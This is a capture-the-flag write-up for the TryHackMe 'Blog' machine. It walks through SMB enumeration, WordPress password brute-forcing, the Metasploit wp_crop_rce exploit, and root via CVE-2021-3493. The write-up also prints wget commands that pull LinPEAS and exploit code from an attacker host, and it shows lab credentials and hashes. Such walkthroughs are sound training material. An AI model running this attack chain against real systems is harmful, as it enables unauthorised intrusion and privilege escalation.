# Blog THM Write-up

<img width="402" height="155" alt="image" src="https://github.com/user-attachments/assets/c6de47f6-1dd6-477c-a78e-bbf20b408b66" />



## Target Information

| IP Address    | Hostname |
| ------------- | -------- |
| 10.49.151.135 | blog.thm |

---

# Reconnaissance

## Nmap Scan

Started with a full TCP scan against the target.

```bash
nmap -sC -sV -O -Pn blog.thm
```

### Results

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu
```

### Observations

* WordPress 5.0 was identified on port 80.
* SMB shares were exposed anonymously.
* Samba signing was not required.
* Possible usernames could potentially be gathered from SMB.

---

# SMB Enumeration

Enumerated SMB shares anonymously.

```bash
smbclient -L //10.49.151.135 -N
```

### Shares

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
BillySMB        Disk      Billy's local SMB Share
IPC$            IPC       IPC Service
```

## Enumerating the Share

Connected to the `BillySMB` share.

```bash
smbclient //10.49.151.135/BillySMB -N
```

### Files

```text
Alice-White-Rabbit.jpg
tswift.mp4
check-this.png
```

### Notes

* `check-this.png` contained a QR code redirecting to a Billy Joel YouTube video.
* `Alice-White-Rabbit.jpg` appeared suspicious and hinted at steganography.

---

# Steganography

Used `steghide` against the image.

```bash
steghide extract -sf Alice-White-Rabbit.jpg
```

An empty passphrase successfully extracted a hidden file.

```bash
cat rabbit_hole.txt
```

Output:

```text
You've found yourself in a rabbit hole, friend.
```

No credentials were recovered, but it confirmed hidden content existed.

---

# Web Enumeration

The target website was identified as a WordPress instance.

## WordPress User Enumeration

Used WPScan to enumerate users.

```bash
wpscan --url http://blog.thm --enumerate u
```

### Users Found

```text
kwheel
bjoel
```

---

# Password Brute Force

Bruteforced the WordPress login for `kwheel`.

```bash
wpscan --url http://blog.thm \
--passwords rockyou.txt \
--usernames kwheel
```

### Valid Credentials

```text
Username: kwheel
Password: cutiepie1
```

---

# Initial Access

After obtaining valid WordPress credentials, searched Metasploit for WordPress 5.0 exploits.

```bash
msfconsole
```

```text
search wordpress 5.0
```

### Relevant Module

```text
exploit/multi/http/wp_crop_rce
```

Selected and configured the exploit.

```bash
use exploit/multi/http/wp_crop_rce
```

Configured:

```text
RHOSTS => blog.thm
USERNAME => kwheel
PASSWORD => cutiepie1
```

Executed the exploit and obtained a shell as `www-data`.

---

# Post Exploitation

## WordPress Configuration

Located WordPress configuration credentials.

```bash
cat /var/www/wordpress/wp-config.php
```

### Database Credentials

```php
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
```

---

# Hash Enumeration

WordPress password hashes were also identified.

```text
bjoel  $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/
kwheel $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te.
```

No additional credentials were recovered from the hashes.

---

# User Flag

Attempted to read the user flag.

```bash
cat /home/bjoel/user.txt
```

Output:

```text
You won't find what you're looking for here.
TRY HARDER
```

The real user flag was hidden elsewhere.

---

# Privilege Escalation

## Enumeration

Performed standard privilege escalation checks:

* SUID binaries
* Capabilities
* Writable files
* Cron jobs

No immediate privilege escalation vectors were identified.

---

# LinPEAS

Transferred and executed LinPEAS.

```bash
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS highlighted a potential kernel vulnerability:

```text
CVE-2021-3493
```

This vulnerability affects OverlayFS on Ubuntu systems.

Reference:

* SSD Advisory OverlayFS PE

---

# Exploiting CVE-2021-3493

Transferred the exploit source code.

```bash
wget http://10.49.71.65:8000/exploit.c
```

Compiled the exploit.

```bash
gcc exploit.c -o exploit
```

Executed it.

```bash
./exploit
```

Successfully obtained a root shell.

```bash
whoami
```

Output:

```text
root
```

---

# Root Flag

```bash
cd /root
cat root.txt
```

Output:

```text
[[REDACTED]]
```

---

# Finding the Real User Flag

Searched for additional `user.txt` files.

```bash
find / -type f -iname *user.txt* 2>/dev/null
```

Discovered another flag file mounted under removable media.

```bash
cat /*****/***/user.txt
```

Output:

```text
[[REDACTED]]
```

---

# Summary

## Attack Path

1. Enumerated open services with Nmap.
2. Enumerated SMB shares anonymously.
3. Investigated files in the SMB share.
4. Enumerated WordPress users using WPScan.
5. Bruteforced WordPress credentials.
6. Exploited WordPress 5.0 using `wp_crop_rce`.
7. Obtained a shell as `www-data`.
8. Enumerated the system with LinPEAS.
9. Exploited `CVE-2021-3493` for privilege escalation.
10. Retrieved both user and root flags.

---
